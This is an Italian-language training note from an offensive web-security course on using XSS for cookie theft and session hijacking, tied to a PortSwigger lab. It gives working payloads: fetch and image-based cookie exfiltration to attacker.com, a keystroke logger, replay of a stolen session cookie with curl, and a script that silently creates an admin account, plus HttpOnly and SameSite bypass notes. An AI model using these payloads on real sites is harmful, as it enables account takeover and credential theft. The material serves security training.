# Cookie Stealing & Session Hijack via XSS

**Difficolta:** Advanced
**Time to Master:** 1.5h
**Prerequisiti:** [06-WAF-Evasion.md](06-WAF-Evasion.md)
**Lab:** PortSwigger Academy — Exploiting XSS to steal cookies

---

## Obiettivo

Trasformare una XSS confermata in un impatto concreto: furto del cookie di sessione della vittima per impersonarla, o azioni per suo conto senza bisogno del cookie (keylogging, CSRF token theft).

---

## Concetti chiave

### Pre-condizione: il cookie deve essere leggibile da JS

Se il cookie ha il flag `HttpOnly`, `document.cookie` NON lo include: in quel caso il furto diretto non funziona, serve un approccio diverso (vedi Evasion piu sotto).

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| webhook.site | crea endpoint univoco | riceve richieste in tempo reale | comodo per test/lab senza server proprio |
| netcat | `nc -lvnp 80` | riceve richiesta grezza | alternativa minimale, no HTTPS |
| server proprio + log | `python3 -m http.server` + access.log | riceve e logga richieste | pieno controllo |

---

## Payload / Esempi

### Esempio 1: esfiltrazione cookie via fetch

```html
<script>
fetch('http://attacker.com/steal?c=' + document.cookie)
</script>
```

### Esempio 2: esfiltrazione via immagine (bypassa alcune CSP che bloccano fetch/XHR ma non img-src)

```html
<script>
new Image().src = 'http://attacker.com/steal?c=' + document.cookie;
</script>
```

### Esempio 3: uso del cookie rubato per impersonare la sessione

```bash
curl "http://target.com/dashboard" -H "Cookie: session=VALORE_RUBATO"
```

Oppure via browser: apri DevTools > Application > Cookies, incolla manualmente il valore rubato.

### Esempio 4: keylogger minimale quando il cookie e HttpOnly

```html
<script>
document.onkeypress = function(e) {
    fetch('http://attacker.com/log?k=' + e.key);
}
</script>
```

**Spiegazione:** se il cookie non e accessibile via JS, l'impatto si sposta su cattura credenziali digitate, azioni eseguite per conto della vittima (CSRF token theft), o interazione diretta col DOM per compiere azioni privilegiate.

### Esempio 5: eseguire un'azione privilegiata per conto della vittima invece di rubare il cookie

```html
<script>
fetch('/api/admin/create_user', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    credentials: 'include',
    body: JSON.stringify({username: 'attacker', password: 'pass123', role: 'admin'})
});
</script>
```

**Spiegazione:** `credentials: 'include'` fa si che la richiesta parta con i cookie di sessione della vittima gia autenticata: non serve rubare nulla, l'azione (es. creare un utente admin) avviene direttamente nel suo contesto.

---

## Evasion / Bypass Techniques

### Bypass HttpOnly (non possibile via JS — serve altro layer)

`HttpOnly` blocca solo la lettura via `document.cookie`; il payload puo comunque compiere azioni privilegiate per conto della vittima (vedi Esempio 5) sfruttando il fatto che il browser invia comunque il cookie nelle richieste, semplicemente JS non puo leggerlo.

### Bypass SameSite=Strict (limita CSRF-style ma non XSS diretta)

Un payload XSS eseguito nello stesso contesto/dominio della vittima non e soggetto alle restrizioni SameSite (che riguardano richieste cross-site): la sessione resta pienamente sfruttabile.

---

## Lab Hands-On

### Lab 1: PortSwigger — Exploiting XSS to steal cookies
**Obiettivo:** rubare il cookie di sessione admin tramite commento stored XSS
**Difficulty:** Difficile
**Time:** 45 min

**Walkthrough breve:**
1. Inserisci payload di stored XSS in un campo visto dall'admin
2. Ricevi il cookie rubato sul tuo endpoint (webhook.site o server proprio)
3. Usa il cookie per accedere come admin

---

## Common Mistakes

- Dare per scontato che HttpOnly renda l'XSS "innocua" -> l'impatto si sposta, non sparisce (vedi Esempio 5)
- Dimenticare `credentials: 'include'` nelle fetch quando serve sfruttare la sessione della vittima per azioni dirette

---

## Link Utili

- [PortSwigger — Exploiting XSS to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting)
- [webhook.site](https://webhook.site/)

---

## Connessioni

- **Prerequisito:** [06-WAF-Evasion.md](06-WAF-Evasion.md)
- **Prossimo Step:** [Lab-Challenges.md](Lab-Challenges.md)
- **Combinazione con:** [06-Authentication-Authorization/02-Session-Hijacking.md](../06-Authentication-Authorization/02-Session-Hijacking.md)

---

## Checklist di padronanza

- [ ] So esfiltrare un cookie non-HttpOnly
- [ ] So agire per conto della vittima quando il cookie e HttpOnly
- [ ] So usare un endpoint esterno per ricevere dati esfiltrati
- [ ] Capisco la differenza pratica tra HttpOnly e SameSite

---

## Note personali

_(spazio libero)_
